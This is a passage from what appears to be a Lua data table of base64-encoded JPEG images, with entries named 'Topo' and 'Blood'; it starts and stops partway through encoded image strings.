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]],
["Topo"] = [[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]],
["Blood"] = [[/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA8LDA0MCg8NDA0REA8SFyYZFxUVFy8iJBwmODE7OjcxNjU9RVhLPUFUQjU2TWlOVFteY2RjPEpsdGxgc1hhY1//2wBDARARERcUFy0ZGS1fPzY/X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1//wAARCAGkAMIDASIAAhEBAxEB/8QAGwAAAgIDAQAAAAAAAAAAAAAAAAECAwQFBgf/xAA9EAABAwIEAwUFBgUEAwEAAAABAAIDBBEFEiExBkFRE2FxgZEiMlKhwQcUI0Kx0RUzYnLhU4Ky8CQ0kvH/xAAaAQEBAQEBAQEAAAAAAAAAAAAAAQIDBAUG/8QAKBEBAQACAgICAgEDBQAAAAAAAAECEQMxEiEEQRNRIhQjcVJhgdHw/9oADAMBAAIRAxEAPwD0NCEIGhJNAkIQgaSEIBCEIBCEIBCEIEEHdNRO6IkEJBNFCaSEDSQhAIQhAkIQgaE0kAhCEDSQhA0JBNAkIQgEIQgEIQgFEp8lFESGyai1SRQhCEAhCEAhCECQhCCSRTQgQTSISuiGhCEUJpJoBCRQgEIQgEJFMIhJO2UlVI7kipDdSuoA6AqSBppBNAIQhAIQhAkIQgkhCECSUkkCTSTRAhCEUFCEIBBQk46II3TBVd9VMIiTjYKosJCsdqAU0FLDoWncK0KuQZXB481IFFS2KkolMIGhCEAhCECQhC